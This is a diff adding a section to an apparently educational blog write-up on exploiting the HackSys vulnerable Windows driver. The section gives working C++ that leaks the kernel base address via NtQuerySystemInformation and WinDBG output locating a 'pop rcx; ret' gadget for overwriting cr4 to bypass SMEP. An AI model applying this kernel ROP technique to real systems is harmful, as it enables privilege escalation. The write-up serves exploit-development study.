@@ -46,9 +46,122 @@ fffff800`10c7b000 fffff800`1149b000   nt
 ---SNIP---
 ```
 
+We need a way also to get this address in our exploit code. For this part, I leaned heavily on code I was able to find by doing google searches with some syntax like: `site:github.com NtQuerySystemInformation` and seeing what I could find. Luckily, I was able to find a lot of code that met my needs perfectly. Unfortunately, on Windows 10 in order to use this API your process requires some level of elevation. But, I had already used the API previously and was quite fond of it for giving me so much trouble the first time I used it to get the kernel base address and wanted to use it again but this time in C++ instead of Python. 
+
+Using a lot of the tricks that I learned from @tekwizz123's HEVD exploits, I was able to get the API exported to my exploit code and was able to use it effectively. I won't go too much into the code here, but this is the function and the typedefs it references to retrieve the base address to the kernel for us:
+```cpp
+typedef struct SYSTEM_MODULE {
+    ULONG                Reserved1;
+    ULONG                Reserved2;
+    ULONG				 Reserved3;
+    PVOID                ImageBaseAddress;
+    ULONG                ImageSize;
+    ULONG                Flags;
+    WORD                 Id;
+    WORD                 Rank;
+    WORD                 LoadCount;
+    WORD                 NameOffset;
+    CHAR                 Name[256];
+}SYSTEM_MODULE, * PSYSTEM_MODULE;
+
+typedef struct SYSTEM_MODULE_INFORMATION {
+    ULONG                ModulesCount;
+    SYSTEM_MODULE        Modules[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+typedef enum _SYSTEM_INFORMATION_CLASS {
+    SystemModuleInformation = 0xb
+} SYSTEM_INFORMATION_CLASS;
+
+typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
+    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    __inout PVOID SystemInformation,
+    __in ULONG SystemInformationLength,
+    __out_opt PULONG ReturnLength
+    );
+
+INT64 get_kernel_base() {
+
+    cout << "[>] Getting kernel base address..." << endl;
+
+    //https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
+    //also using the same import technique that @tekwizz123 showed us
+
+    PNtQuerySystemInformation NtQuerySystemInformation =
+        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+            "NtQuerySystemInformation");
+
+    if (!NtQuerySystemInformation) {
+
+        cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
+        cout << "[!] Last error " << GetLastError() << endl;
+        exit(1);
+    }
+
+    ULONG len = 0;
+    NtQuerySystemInformation(SystemModuleInformation,
+        NULL,
+        0,
+        &len);
+
+    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
+        VirtualAlloc(NULL,
+            len,
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_EXECUTE_READWRITE);
+
+    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
+        pModuleInfo,
+        len,
+        &len);
+
+    if (status != (NTSTATUS)0x0) {
+        cout << "[!] NtQuerySystemInformation failed!" << endl;
+        exit(1);
+    }
+
+    PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;
+
+    cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;
+
+    return (INT64)kernelImageBase;
+}
+```
+
+This code imports `NtQuerySystemInformation` from `nt.dll` and allows us to use it with the `System Module Information` parameter which returns to us a nice struct of a `ModulesCount` (how many kernel modules are loaded) and an array of the `Modules` themselves which have a lot of struct members included a `Name`. In all my research I couldn't find an example where the kernel image wasn't index value `0` so that's what I've implemented here. 
+
+You could use a lot of the cool `string` functions in C++ to easily get the base address of any kernel mode driver as long as you have the name of the `.sys` file. You could cast the `Modules.Name` member to a string and do a substring match routine to locate your desired driver as you iterate through the array and return the base address. So now that we have the base address figured out, we can move on to hunting the gadgets.
+
+## Hunting Gadgets
+
 Again, just following along with Abatchy's blog, we can find the first gadget (actually the 2nd in our code) by locating a gadget that allows us to place a value into `cr4` easily and then takes a `ret` soon after. Luckily for us, this gadget exists inside of `nt!HvlEndSystemInterrupt`. 
 
 We can find it in WinDBG with the following:
 ```
+kd> uf HvlEndSystemInterrupt
+nt!HvlEndSystemInterrupt:
+fffff800`10dc1560 4851            push    rcx
+fffff800`10dc1562 50              push    rax
+fffff800`10dc1563 52              push    rdx
+fffff800`10dc1564 65488b142588610000 mov   rdx,qword ptr gs:[6188h]
+fffff800`10dc156d b970000040      mov     ecx,40000070h
+fffff800`10dc1572 0fba3200        btr     dword ptr [rdx],0
+fffff800`10dc1576 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff800`10dc157e)
 
-## Conclusion
+nt!HvlEndSystemInterrupt+0x18:
+fffff800`10dc1578 33c0            xor     eax,eax
+fffff800`10dc157a 8bd0            mov     edx,eax
+fffff800`10dc157c 0f30            wrmsr
+
+nt!HvlEndSystemInterrupt+0x1e:
+fffff800`10dc157e 5a              pop     rdx
+fffff800`10dc157f 58              pop     rax
+fffff800`10dc1580 59              pop     rcx								// Gadget at offset from nt: +0x146580
+fffff800`10dc1581 c3              ret
+```
+
+As Abatchy did, I've added a comment so you can see the gadget we're after. We want this:
+`pop rcx`
+
+`ret`
+routine because if we can place an arbitrary value into `rcx`, there is a second gadget which allows us to `mov cr4, rcx` and then we'd have everything we need. 
